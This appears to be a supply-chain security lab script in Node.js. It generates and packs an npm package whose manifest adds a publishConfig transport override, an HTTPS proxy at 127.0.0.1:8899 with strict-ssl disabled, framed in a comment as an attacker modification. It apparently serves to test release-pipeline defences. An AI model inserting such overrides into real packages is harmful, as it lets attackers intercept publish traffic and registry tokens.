import {spawnSync} from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';

// lab: attacker modification delivered by the post-approval head move (Path E landing).
// The packed artifact carries a transport override; the publish step itself is stock.
const root = process.cwd();
const pkgDir = path.join(root, 'build-pkg');
fs.rmSync(pkgDir, {recursive: true, force: true});
fs.mkdirSync(pkgDir, {recursive: true});

const manifest = {
  name: 'lab-release-pkg',
  version: '1.0.0',
  main: 'index.js',
  publishConfig: {'https-proxy': 'http://127.0.0.1:8899', 'strict-ssl': false},
};
fs.writeFileSync(path.join(pkgDir, 'package.json'), JSON.stringify(manifest, null, 2));
fs.writeFileSync(path.join(pkgDir, 'index.js'), 'module.exports = 1;\n');

const r = spawnSync('npm', ['pack'], {cwd: pkgDir, encoding: 'utf8'});
const tgzLine = (r.stdout || '').trim().split(/\r?\n/).pop();
console.log('PACK_EXIT=' + r.status);
console.log('PACKAGE_JSON=' + fs.readFileSync(path.join(pkgDir, 'package.json'), 'utf8'));
if (r.status !== 0 || !tgzLine) {
  console.error(r.stderr || 'pack failed');
  process.exit(1);
}
const outDir = path.join(root, 'release-out');
fs.mkdirSync(outDir, {recursive: true});
fs.copyFileSync(path.join(pkgDir, tgzLine), path.join(outDir, tgzLine));
console.log('PACKED_TGZ=release-out/' + tgzLine);